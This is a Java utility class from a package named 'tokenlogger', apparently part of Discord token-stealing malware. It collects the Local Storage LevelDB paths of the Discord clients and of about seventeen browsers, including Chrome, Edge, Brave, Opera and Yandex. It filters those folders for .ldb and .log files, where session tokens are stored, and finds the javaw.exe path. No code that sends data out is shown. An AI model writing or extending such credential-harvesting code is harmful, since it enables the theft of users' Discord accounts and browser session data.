package tokenlogger.utils;

import java.util.Arrays;
import java.util.List;
import java.util.ArrayList;
import java.io.File;
import java.nio.file.Paths;

public class PathHelper {
    public static final String ROAMING = System.getenv("APPDATA");
    public static final String LOCAL = System.getenv("LOCALAPPDATA");
    private static List<String> clientPaths = new ArrayList<>();
    private static List<String> browserPaths = new ArrayList<>();

    public static List<String> loadClientPaths() {
        addPath(clientPaths, ROAMING, "discord");           // Discord
        addPath(clientPaths, ROAMING, "discordcanary");     // Discord Canary
        addPath(clientPaths, ROAMING, "discordptb");        // Discord PTB

        return clientPaths;
    }

    public static List<String> loadBrowserPaths() {
        addPath(browserPaths, LOCAL, "Chromium", "User Data", "Default", "Local Storage", "leveldb");                               // Ungoogled Chromium
        addPath(browserPaths, LOCAL, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb");                       // Google Chrome
        addPath(browserPaths, LOCAL, "Google", "Chrome Beta", "User Data", "Default", "Local Storage", "leveldb");                  // Google Chrome Beta
        addPath(browserPaths, LOCAL, "Google", "Chrome Dev", "User Data", "Default", "Local Storage", "leveldb");                   // Google Chrome Dev
        addPath(browserPaths, LOCAL, "Google", "Chrome SxS", "User Data", "Default", "Local Storage", "leveldb");                   // Google Chrome Canary
        addPath(browserPaths, LOCAL, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb");                      // Microsoft Edge
        addPath(browserPaths, LOCAL, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb");         // Brave
        addPath(browserPaths, LOCAL, "Vivaldi", "User Data", "Default", "Local Storage", "leveldb");                                // Vivaldi
        addPath(browserPaths, ROAMING, "Opera Software", "Opera Stable", "Local Storage", "leveldb");                               // Opera
        addPath(browserPaths, ROAMING, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb");                            // Opera GX
        addPath(browserPaths, ROAMING, "Opera Software", "Opera GX", "Local Storage", "leveldb");                                   // Opera GX Legacy
        addPath(browserPaths, ROAMING, "Opera Software", "Opera Next", "Default", "Local Storage", "leveldb");                      // Opera Beta
        addPath(browserPaths, ROAMING, "Opera Software", "Opera Developer", "Default", "Local Storage", "leveldb");                 // Opera Developer
        addPath(browserPaths, LOCAL, "Iridium", "User Data", "Default", "Local Storage", "leveldb");                                // Iridium
        addPath(browserPaths, LOCAL, "Epic Privacy Browser", "User Data", "Default", "Local Storage", "leveldb");                   // Epic Privacy Browser
        addPath(browserPaths, LOCAL, "falkon", "profiles", "default", "Local Storage", "leveldb");                                  // Falkon
        addPath(browserPaths, LOCAL, "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb");                // Yandex

        return browserPaths;
    }

    private static void addPath(List<String> list, String... elements) {
        list.add(Paths.get(elements[0], Arrays.copyOfRange(elements, 1, elements.length)).toString());
    }

    public static List<File> listValidFiles(String path) {
        List<File> validFiles = new ArrayList<>();

        File directory = new File(path);
        if (!directory.exists()) return validFiles;

        for (File file : directory.listFiles()) {
            String fileName = file.getName();
            if (fileName.endsWith(".ldb") || fileName.endsWith(".log")) validFiles.add(file);
        }

        return validFiles;
    }

    public static String getJavaPath() {
        return System.getProperty("sun.boot.library.path") + "\\javaw.exe";
    }
}
